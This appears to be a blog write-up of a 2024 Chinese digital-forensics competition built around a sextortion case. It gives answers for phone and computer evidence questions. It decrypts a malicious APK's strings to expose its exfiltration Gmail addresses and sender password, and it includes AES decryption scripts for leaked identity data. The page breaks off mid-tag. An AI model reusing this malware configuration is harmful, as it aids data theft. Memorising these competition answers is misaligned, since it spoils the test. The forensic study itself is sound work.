href="https://mp.weixin.qq.com/s?__biz=MzkyMDUzMjIwOA==&mid=2247484636&idx=1&sn=09e71ed6fddfe0cc1f0d77e30c6ed424&chksm=c07fc88ab31d40aac151499cec0b2af9d59cecf0983f133a68b5fe07cb6517988147f41b89e2&mpshare=1&scene=23&srcid=10064osz9zZxRkPOzNbuBJ5D&sharer_shareinfo=aa5942e3fb9d2921b10bd20334c60fa8&sharer_shareinfo_first=aa5942e3fb9d2921b10bd20334c60fa8#rd">2024第二届“龙信杯”电子数据取证竞赛部分wp[手机、服务器全解]——宇灏</a></p><p><a href="https://blog.csdn.net/qq_43491969">2024年第二届龙信杯writeup——郃灬荈</a></p><h3 id="案情介绍-1"><a href="#案情介绍-1" class="headerlink" title="案情介绍"></a>案情介绍</h3><blockquote><p>​近期，某公安机关正式受理了一起受害者报案案件。受害者陈述称，其通过<strong>微信</strong>平台结识了一名自称为相亲中介服务的客服人员。该客服人员诱骗受害者参与所谓的“相亲对象筛选”活动，即所谓的“选妃”过程。在受害者不察之下，整个交流过程被<strong>犯罪团伙</strong>暗中<strong>录音录像</strong>。随后，该<strong>客服</strong>人员以提供更多潜在相亲对象为由，诱导受害者下载并安装了一款预先准备好的<strong>恶意木马应用程序（APP）</strong>。一旦受害者安装了此 APP，犯罪嫌疑人便利用手中掌握的录音录像资料以及受害者的<strong>通讯录信息</strong>作为威胁手段，对受害者实施多次<strong>敲诈勒索和诈骗</strong>行为。面对持续的<strong>精神压力和经济损失</strong>，受害者最终不堪重负，决定向公安机关报案，以期揭露并制止这一恶劣的犯罪行为。</p><p>​警方赶到现场后，发现涉案团伙参与另一起侵公案件，故迅速对现场设备进行证据固定制作镜像，并制作以下检材清单，请对检材分析</p></blockquote><h3 id="检材清单-1"><a href="#检材清单-1" class="headerlink" title="检材清单"></a>检材清单</h3><table><thead><tr><th>序号</th><th>检材信息</th><th>检材大小</th><th>检材哈希(MD5)</th></tr></thead><tbody><tr><td>1</td><td>受害人手机检材.dd</td><td>24,226,000,896 字节</td><td>f0fcbf82c134b5c47aac5355b74a83d8</td></tr><tr><td>2</td><td>涉案计算机检材.E01</td><td>12,510,412,800 字节</td><td>43d8b3820cd5103b42773b80140939aa</td></tr><tr><td>3</td><td>涉案服务器检材.E01</td><td>8,471,552,000 字节</td><td>6f970587231acbae7333b28168adc3b3</td></tr><tr><td>4</td><td>数据流量包.pcapng</td><td>17,334,272 字节</td><td>7847c2ee62660ea0696d99125d997628</td></tr></tbody></table><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><h4 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证"></a>手机取证</h4><p>被自己蠢哭了，比赛前只用了火眼证据分析软件的授权，忘记下火眼手机证据分析的授权，我就奇怪为什么分析的选项里没有android和ios</p><h5 id="1-分析手机检材，请问此手机共通过adb连接过几个设备？-标准格式：3"><a href="#1-分析手机检材，请问此手机共通过adb连接过几个设备？-标准格式：3" class="headerlink" title="1 分析手机检材，请问此手机共通过adb连接过几个设备？[标准格式：3]"></a>1 分析手机检材，请问此手机共通过adb连接过几个设备？[标准格式：3]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006200507522.png" alt="image-20241006200507522"></p><p>原来这玩意儿存的是公钥或指纹啊，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;</span><br><span class="line">&lt;keyStore version=&quot;1&quot;&gt;</span><br><span class="line">&lt;adbKey key=&quot;QAAAAHdfu6K51aZv16ST3QOLTPwar+5ITRqhyjciZ8bj/m8hzn6E/Wpyez22szYatkPEJbyi8VO+r/U9XNpNYLytLH61ae0tMmgAFbZ9y/PCfmrX8SnNBLtKY7ThFi8Vxe3aSzwcD+Jlp2LYE+4Fr59Y1nceY1HdmcNnoHW0/u9YBulHELLWqdkuMQ06mgG3BA5BkGKgzPyoc8e9LZPwnc01eTwi1YiB/SqeIuTy1phuE0fvFKq/ILuS5SkiLqX0EHVJy+dZB4f6ylMVrLFrxldkCRhXIWhXQE04H7ZTIEZJKzASgH0Du0lgh5XMxAR524QKEiu3DUnyRrjHTr92mvhW4ldwhojaD6KbxMbh3wM83KJQh9QK/VitEy+326oWfJU8qVfRnGZWgWla2cQNZed2VJOOwxRO/8VqHrMT39vdMxiA8ZQAPS1M0PI1X7TeFVqHYIj6BJyjrZywGx5j5G5KsH/Pr6NpE5c+S/+v6a/Il6+E+wW7K5DxZgZ1K036H0d86Et8bhuuf+pDZKuU3iHmtQtMv+NOWMVUTVfm95OXegcnMS4WJ83zgryiD83n2tnIdUHQWdRETuqiIevxClKTyp2hVihQH7iT4ADvxTtDZdHN0E82YmX7HjWLM535dSjBW2SRUYptiLUaD13sTew7Dqm1rhNohNk5X3b/Fq+Dbv+bWCv4pgEAAQA= unknown@unknown&quot; lastConnection=&quot;1726623632427&quot; /&gt;</span><br><span class="line">&lt;adbKey key=&quot;QAAAABGedigP7Uda6pstowLZH+MGEDSgsd2iz/3ttJgYwNSBHGhP2eIju402Vl/aRQ1vf0mb7/EudWG1mVTFSKbDFmHu9e/vOxFcW9CxEvCEvjj41XM8FvUGulS8mjkq0KSysW0WxvVWN7JHPqVxadLlnk2eu/kXqDBwSphwQiNUs9ymy45xINFyQlL/yJHn5H4eIgVlcV/yZqBSGJ71voFFmh9xr53v1HkXZJCsQHju3DO0cA9MM2Ye/6zrxdrbPSl+Z9BRE+iDO2nAvj6EsdpqCDmnrGCauUoIk3k0BU8DSWcJ5miOY4aB+u3rTLNUo0+TT0vW3b2kXv+fp0hF+cEILx5L3XjRMxWgU8FMaFrmnp+qu6dRMFr9JNfkaCOFpgVswONPRr5D8v9YPaBkdQ25fqaWC/a4e3LuHkRxiVgIk5v2Tic3wwjfQbaQTanLQ8aZG8EAazqTTm/2PWk/hevcUvjvKsZlJso9RB64GaOUR2sUunmOmnmMScQvLOIa2uH0fKkTD+2DUoxC/CtmRGbR/UUvzVnvxU/2Dw5XXWKqlsLpuNHyZr7nRI2Pg0YldnXRvSmX2sl+vFjNAEHJaeNkFfdxRAnitWNWIZD7StOdw0A/RT7wN6Ds540bNdbg+ROOHGxmgqNjlY6AVC7f69yxj8Z8NO13zq3b7Px4+Is0kVWTylWTugEAAQA= unknown@unknown&quot; lastConnection=&quot;1726581100084&quot; /&gt;</span><br><span class="line">&lt;/keyStore&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006200838272.png" alt="image-20241006200838272"></p><h5 id="2-分析手机检材，机主参加考试的时间是什么时候？-标准格式：2024-06-17"><a href="#2-分析手机检材，机主参加考试的时间是什么时候？-标准格式：2024-06-17" class="headerlink" title="2 分析手机检材，机主参加考试的时间是什么时候？[标准格式：2024-06-17]"></a>2 分析手机检材，机主参加考试的时间是什么时候？[标准格式：2024-06-17]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-08-23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427963.png" alt="image-20240929195718012"></p><h5 id="3-分析手机检材，请问手机的蓝牙Mac地址是多少？-标准格式：12-12-12-12-12-12"><a href="#3-分析手机检材，请问手机的蓝牙Mac地址是多少？-标准格式：12-12-12-12-12-12" class="headerlink" title="3 分析手机检材，请问手机的蓝牙Mac地址是多少？[标准格式：12:12:12:12:12:12]"></a>3 分析手机检材，请问手机的蓝牙Mac地址是多少？[标准格式：12:12:12:12:12:12]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">48:87:59:76:21:0f</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427964.png" alt="image-20240929195218239"></p><h5 id="4-分析手机检材，请问压缩包加密软件共加密过几份文件？-标准格式：3"><a href="#4-分析手机检材，请问压缩包加密软件共加密过几份文件？-标准格式：3" class="headerlink" title="4 分析手机检材，请问压缩包加密软件共加密过几份文件？[标准格式：3]"></a>4 分析手机检材，请问压缩包加密软件共加密过几份文件？[标准格式：3]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006202622970.png" alt="image-20241006202622970"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006203027729.png" alt="image-20241006203027729"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006202714650.png" alt="image-20241006202714650"></p><h5 id="5-分析手机检材，请问机主的另外一个155的手机号码是多少？-标准格式：15555000555"><a href="#5-分析手机检材，请问机主的另外一个155的手机号码是多少？-标准格式：15555000555" class="headerlink" title="5 分析手机检材，请问机主的另外一个155的手机号码是多少？[标准格式：15555000555]"></a>5 分析手机检材，请问机主的另外一个155的手机号码是多少？[标准格式：15555000555]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15599555555</span><br></pre></td></tr></table></figure><p>FileComporess反编译源码看主函数有密码</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006204434243.png" alt="image-20241006204434243"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006204542759.png" alt="image-20241006204542759"></p><h5 id="6-分析手机检材，其手机存在一个加密容器，请问其容器密码是多少。（标准格式：abc123）"><a href="#6-分析手机检材，其手机存在一个加密容器，请问其容器密码是多少。（标准格式：abc123）" class="headerlink" title="6 分析手机检材，其手机存在一个加密容器，请问其容器密码是多少。（标准格式：abc123）"></a>6 分析手机检材，其手机存在一个加密容器，请问其容器密码是多少。（标准格式：abc123）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d7Avsd!Y]u&#125;J8i(1bnDD@&lt;-o</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006204612170.png" alt="image-20241006204612170"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006204649007.png" alt="image-20241006204649007"></p><h5 id="7-分析手机检材，接上问，其容器中存在一份成员名单，嫌疑人曾经误触导致表格中的一个成员姓名被错误修改，请确认这个成员的原始正确姓名？-标准格式：张三"><a href="#7-分析手机检材，接上问，其容器中存在一份成员名单，嫌疑人曾经误触导致表格中的一个成员姓名被错误修改，请确认这个成员的原始正确姓名？-标准格式：张三" class="headerlink" title="7 分析手机检材，接上问，其容器中存在一份成员名单，嫌疑人曾经误触导致表格中的一个成员姓名被错误修改，请确认这个成员的原始正确姓名？[标准格式：张三]"></a>7 分析手机检材，接上问，其容器中存在一份成员名单，嫌疑人曾经误触导致表格中的一个成员姓名被错误修改，请确认这个成员的原始正确姓名？[标准格式：张三]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">陆俊梅</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006205541909.png" alt="image-20241006205541909"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006205927717.png" alt="image-20241006205927717"></p><p>比较两个表格发现陆俊梅被改成了陆陆</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line"># 加载两个Excel文件</span><br><span class="line">df1 = pd.read_excel(&#x27;1.xlsx&#x27;)</span><br><span class="line">df2 = pd.read_excel(&#x27;2.xlsx&#x27;)</span><br><span class="line"></span><br><span class="line"># 确保两个表格的行和列对齐</span><br><span class="line">df1 = df1.reindex_like(df2)</span><br><span class="line"></span><br><span class="line"># 比较两个表格</span><br><span class="line">differences = df1.compare(df2)</span><br><span class="line"></span><br><span class="line"># 打印出不同的单元格</span><br><span class="line">if not differences.empty:</span><br><span class="line">    print(&quot;以下是两个表格中不同的单元格内容：&quot;)</span><br><span class="line">    print(differences)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;两个表格内容完全相同。&quot;)</span><br><span class="line"></span><br><span class="line"># 如果需要，可以将差异保存到一个新的Excel文件中</span><br><span class="line">differences.to_excel(&#x27;differences.xlsx&#x27;)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006212322135.png" alt="image-20241006212322135"></p><h5 id="8-分析手机检材，接上题，请确认该成员的对应的最高代理人是谁（不考虑总部）？-标准格式：张三"><a href="#8-分析手机检材，接上题，请确认该成员的对应的最高代理人是谁（不考虑总部）？-标准格式：张三" class="headerlink" title="8 分析手机检材，接上题，请确认该成员的对应的最高代理人是谁（不考虑总部）？[标准格式：张三]"></a>8 分析手机检材，接上题，请确认该成员的对应的最高代理人是谁（不考虑总部）？[标准格式：张三]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">刘珏兰</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006213244325.png" alt="image-20241006213244325"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006213253496.png" alt="image-20241006213253496"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006213303841.png" alt="image-20241006213303841"></p><h5 id="9-分析手机检材，请确认在该组织中，最高层级的层次是多少？（从总部开始算第一级）-标准格式：10"><a href="#9-分析手机检材，请确认在该组织中，最高层级的层次是多少？（从总部开始算第一级）-标准格式：10" class="headerlink" title="9 分析手机检材，请确认在该组织中，最高层级的层次是多少？（从总部开始算第一级）[标准格式：10]"></a>9 分析手机检材，请确认在该组织中，最高层级的层次是多少？（从总部开始算第一级）[标准格式：10]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12</span><br></pre></td></tr></table></figure><p>11+1（算上总部）</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006215637890.png" alt="image-20241006215637890"></p><h5 id="10-分析手机检材，请问第二层级（从总部开始算第一级）人员最多的人是多少人？-标准格式：100"><a href="#10-分析手机检材，请问第二层级（从总部开始算第一级）人员最多的人是多少人？-标准格式：100" class="headerlink" title="10  分析手机检材，请问第二层级（从总部开始算第一级）人员最多的人是多少人？[标准格式：100]"></a>10  分析手机检材，请问第二层级（从总部开始算第一级）人员最多的人是多少人？[标准格式：100]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">60</span><br></pre></td></tr></table></figure><p>这题看群里讨论的很激烈，到底是按姓名还是按手机号，因为有两个重名的，讨论居然上升到法庭</p><p>&#x3D; &#x3D;!，我选手机号，手机号没重复</p><h5 id="11-分析手机检材，机主共开启了几款APP应用分身？-标准格式：3"><a href="#11-分析手机检材，机主共开启了几款APP应用分身？-标准格式：3" class="headerlink" title="11 分析手机检材，机主共开启了几款APP应用分身？[标准格式：3]"></a>11 分析手机检材，机主共开启了几款APP应用分身？[标准格式：3]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427965.png" alt="image-20240929200836061"></p><h5 id="12-分析手机检材，请问机主现在安装了几款即时通讯软件（微博除外）？-标准格式：1"><a href="#12-分析手机检材，请问机主现在安装了几款即时通讯软件（微博除外）？-标准格式：1" class="headerlink" title="12 分析手机检材，请问机主现在安装了几款即时通讯软件（微博除外）？[标准格式：1]"></a>12 分析手机检材，请问机主现在安装了几款即时通讯软件（微博除外）？[标准格式：1]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427966.png" alt="image-20240929201843240"></p><h5 id="13-分析手机检材，请问勒索机主的账号是多少（非微信ID）？-标准格式：AB123CD45"><a href="#13-分析手机检材，请问勒索机主的账号是多少（非微信ID）？-标准格式：AB123CD45" class="headerlink" title="13 分析手机检材，请问勒索机主的账号是多少（非微信ID）？[标准格式：AB123CD45]"></a>13 分析手机检材，请问勒索机主的账号是多少（非微信ID）？[标准格式：AB123CD45]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1836042664454131712</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427967.png" alt="image-20240929202040394"></p><h5 id="14-分析手机检材，接上问，请问机主通过此应用共删除了多少条聊天记录-？-标准格式：2"><a href="#14-分析手机检材，接上问，请问机主通过此应用共删除了多少条聊天记录-？-标准格式：2" class="headerlink" title="14 分析手机检材，接上问，请问机主通过此应用共删除了多少条聊天记录 ？[标准格式：2]"></a>14 分析手机检材，接上问，请问机主通过此应用共删除了多少条聊天记录 ？[标准格式：2]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427968.png" alt="image-20240929202142016"></p><h5 id="15-分析手机检材，请问会盗取手机信息的APP应用包名是什么？-标准格式：com-lx-tt"><a href="#15-分析手机检材，请问会盗取手机信息的APP应用包名是什么？-标准格式：com-lx-tt" class="headerlink" title="15 分析手机检材，请问会盗取手机信息的APP应用包名是什么？[标准格式：com.lx.tt]"></a>15 分析手机检材，请问会盗取手机信息的APP应用包名是什么？[标准格式：com.lx.tt]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.lxlxlx.luoliao</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427969.png" alt="image-20240929203701417"></p><h5 id="luoliao-APP逆向解密"><a href="#luoliao-APP逆向解密" class="headerlink" title="luoliao APP逆向解密"></a>luoliao APP逆向解密</h5><p>可以看见有几个字符串比较特殊，跟进一下</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007133559066.png" alt="image-20241007133559066"></p><p>用的b.b.a.a.a，继续跟进</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007133728329.png" alt="image-20241007133728329"></p><p>aes解密函数</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007133743975.png" alt="image-20241007133743975"></p><p>这下很清楚了，下面这些全是需要解密的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public String s0 = &quot;4SLYY9lHJ2SnY4PTeoNuPQ==&quot;;</span><br><span class="line">public String t0 = &quot;QImJWFMqlVTJBaO+wCQwJA==&quot;;</span><br><span class="line">public String u0 = &quot;sdEHP/sn3FM3JsJpW0Pjf8fFuvE=&quot;;</span><br><span class="line">public String v0 = &quot;sdEHP/sn3FM3JsJpW0Pjf8kVHSloexlf5yCiIlbyZ4Y=&quot;;</span><br><span class="line">public String w0 = &quot;iSkrO/5aOpJ6AAFQNl4t/9k013k52gh6U+1240De1D&quot;;</span><br><span class="line">public String x0 = &quot;EVJaQJ7ByaJExZmcgdXkz92RANgWCqZ/T6prig6uqOFA==&quot;;</span><br></pre></td></tr></table></figure><p>key是下面这个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E10ADC3949BA59ABBE56E057F20F883E</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007135205744.png" alt="image-20241007135205744"></p><p>得到以下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public String v0 = &quot;1304567895@gmail.com&quot;;</span><br><span class="line">public String w0 = &quot;iSkrO/5aOpJ6AAFQNl4t/9k013k52gh6U+1240De1D&quot;;</span><br><span class="line">public String x0 = &quot;EVJaQJ7ByaJExZmcgdXkz92RANgWCqZ/T6prig6uqOFA==&quot;;</span><br><span class="line">w0+x0：软件有问题，请联系boss电话：40085222666</span><br></pre></td></tr></table></figure><h5 id="16-接上题，请问该软件作者预留的座机号码是多少？-标准格式：40088855555"><a href="#16-接上题，请问该软件作者预留的座机号码是多少？-标准格式：40088855555" class="headerlink" title="16 接上题，请问该软件作者预留的座机号码是多少？[标准格式：40088855555]"></a>16 接上题，请问该软件作者预留的座机号码是多少？[标准格式：40088855555]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">40085222666</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007135324412.png" alt="image-20241007135324412"></p><h5 id="17-接上题，恶意程序偷取数据的收件邮箱地址的gmail邮箱是多少？-标准格式：-x6c-x78-x40-103-109-97-x69-108-x2e-99-x6f-x6d"><a href="#17-接上题，恶意程序偷取数据的收件邮箱地址的gmail邮箱是多少？-标准格式：-x6c-x78-x40-103-109-97-x69-108-x2e-99-x6f-x6d" class="headerlink" title="17 接上题，恶意程序偷取数据的收件邮箱地址的gmail邮箱是多少？[标准格式：&#x6c;&#x78;&#x40;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;]"></a>17 接上题，恶意程序偷取数据的收件邮箱地址的gmail邮箱是多少？[标准格式：<a href="mailto:&#x6c;&#x78;&#x40;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#x6c;&#x78;&#x40;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;</a>]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1304567895@gmail.com</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007135344511.png" alt="image-20241007135344511"></p><h5 id="18-接上题，恶意程序偷取数据的发件邮箱地址是多少？-标准格式：-x6c-120-64-103-109-97-x69-108-x2e-x63-111-109"><a href="#18-接上题，恶意程序偷取数据的发件邮箱地址是多少？-标准格式：-x6c-120-64-103-109-97-x69-108-x2e-x63-111-109" class="headerlink" title="18 接上题，恶意程序偷取数据的发件邮箱地址是多少？[标准格式：&#x6c;&#120;&#64;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;]"></a>18 接上题，恶意程序偷取数据的发件邮箱地址是多少？[标准格式：<a href="mailto:&#x6c;&#120;&#64;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;">&#x6c;&#120;&#64;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;</a>]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">temp1234@gmail.com</span><br></pre></td></tr></table></figure><p>搜smtp</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007135451968.png" alt="image-20241007135451968"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007135509308.png" alt="image-20241007135509308"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007135611105.png" alt="image-20241007135611105"></p><h5 id="19-接上题，恶意程序偷取数据的发件邮箱密码是多少？-标准格式：abc123"><a href="#19-接上题，恶意程序偷取数据的发件邮箱密码是多少？-标准格式：abc123" class="headerlink" title="19 接上题，恶意程序偷取数据的发件邮箱密码是多少？[标准格式：abc123]"></a>19 接上题，恶意程序偷取数据的发件邮箱密码是多少？[标准格式：abc123]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qwer123456</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007135626119.png" alt="image-20241007135626119"></p><h5 id="20-接上题，恶意程序定义收发件的地址函数是什么？-标准格式：a"><a href="#20-接上题，恶意程序定义收发件的地址函数是什么？-标准格式：a" class="headerlink" title="20 接上题，恶意程序定义收发件的地址函数是什么？[标准格式：a]"></a>20 接上题，恶意程序定义收发件的地址函数是什么？[标准格式：a]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a</span><br></pre></td></tr></table></figure><p>上面是定义和实例化类，下面是收发的一些东西</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007140344041.png" alt="image-20241007140344041"></p><h4 id="计算机取证-1"><a href="#计算机取证-1" class="headerlink" title="计算机取证"></a>计算机取证</h4><h5 id="仿真"><a href="#仿真" class="headerlink" title="仿真"></a>仿真</h5><p>注意不要重置密码，密码990528</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006233250127.png" alt="image-20241006233250127"></p><p>有efs加密文件</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006233453754.png" alt="image-20241006233453754"></p><p>然后就可以成功解锁加密文件，如果改了密码，证书就没了，无法解密</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006233349126.png" alt="image-20241006233349126"></p><h5 id="1-分析计算机检材，嫌疑人在将其侵公数据出售前在Pycharm中进行了AES加密，用于加密的key是多少？-标准格式：1A23456ABCD"><a href="#1-分析计算机检材，嫌疑人在将其侵公数据出售前在Pycharm中进行了AES加密，用于加密的key是多少？-标准格式：1A23456ABCD" class="headerlink" title="1  分析计算机检材，嫌疑人在将其侵公数据出售前在Pycharm中进行了AES加密，用于加密的key是多少？[标准格式：1A23456ABCD]"></a>1  分析计算机检材，嫌疑人在将其侵公数据出售前在Pycharm中进行了AES加密，用于加密的key是多少？[标准格式：1A23456ABCD]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">65B2564BG89F16G9</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006233941416.png" alt="image-20241006233941416"></p><h5 id="2-分析计算机检材，身份证为”371963195112051505”这个人的手机号码是多少？-标准格式：13013524420"><a href="#2-分析计算机检材，身份证为”371963195112051505”这个人的手机号码是多少？-标准格式：13013524420" class="headerlink" title="2  分析计算机检材，身份证为”371963195112051505”这个人的手机号码是多少？[标准格式：13013524420]"></a>2  分析计算机检材，身份证为”371963195112051505”这个人的手机号码是多少？[标准格式：13013524420]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15075547510</span><br></pre></td></tr></table></figure><p>根据加密脚本让gpt写个解密脚本解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import unpad</span><br><span class="line"></span><br><span class="line">def aes_decrypt(encrypted_data, key, iv):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)</span><br><span class="line">    return decrypted_data.decode()</span><br><span class="line"></span><br><span class="line">key = b&#x27;65B2564BG89F16G9&#x27;</span><br><span class="line">iv = b&#x27;83E6CBEF547944CF&#x27;</span><br><span class="line"></span><br><span class="line">input_file = &quot;encrypted_data.txt&quot;</span><br><span class="line">output_file = &quot;decrypted_data.txt&quot;</span><br><span class="line"></span><br><span class="line">def process_decrypted_data(input_file, output_file, key, iv):</span><br><span class="line">    with open(input_file, &quot;r&quot;) as f_in, open(output_file, &quot;w&quot;) as f_out:</span><br><span class="line">        for line in f_in:</span><br><span class="line">            parts = line.strip().split(&#x27;,&#x27;)</span><br><span class="line">            index = parts[0]</span><br><span class="line">            f_out.write(index + &quot;,&quot;)</span><br><span class="line"></span><br><span class="line">            decrypted_parts = []</span><br><span class="line">            for part in parts[1:]:</span><br><span class="line">                encrypted_part = bytes.fromhex(part)</span><br><span class="line">                decrypted_part = aes_decrypt(encrypted_part, key, iv)</span><br><span class="line">                decrypted_parts.append(decrypted_part)</span><br><span class="line"></span><br><span class="line">            f_out.write(&quot;,&quot;.join(decrypted_parts) + &quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">process_decrypted_data(input_file, output_file, key, iv)</span><br><span class="line"></span><br><span class="line">print(&quot;解密完成。&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006235835498.png" alt="image-20241006235835498"></p><h5 id="3-分析计算机检材，对解密后的身份证数据列进行单列去重操作，重复的身份证号码数量是多少？-身份证不甄别真假-标准格式：100"><a href="#3-分析计算机检材，对解密后的身份证数据列进行单列去重操作，重复的身份证号码数量是多少？-身份证不甄别真假-标准格式：100" class="headerlink" title="3  分析计算机检材，对解密后的身份证数据列进行单列去重操作，重复的身份证号码数量是多少？(身份证不甄别真假)[标准格式：100]"></a>3  分析计算机检材，对解密后的身份证数据列进行单列去重操作，重复的身份证号码数量是多少？(身份证不甄别真假)[标准格式：100]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure><p>检查了几遍都是0</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007001211665.png" alt="image-20241007001211665"></p><h5 id="4-分析计算机检材，接上题，根据身份证号码（第17位）分析性别，男性的数据是多少条？-标准格式：100"><a href="#4-分析计算机检材，接上题，根据身份证号码（第17位）分析性别，男性的数据是多少条？-标准格式：100" class="headerlink" title="4  分析计算机检材，接上题，根据身份证号码（第17位）分析性别，男性的数据是多少条？[标准格式：100]"></a>4  分析计算机检材，接上题，根据身份证号码（第17位）分析性别，男性的数据是多少条？[标准格式：100]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5001714</span><br></pre></td></tr></table></figure><p>注意不是0和1，是奇偶</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241007003109359.png" 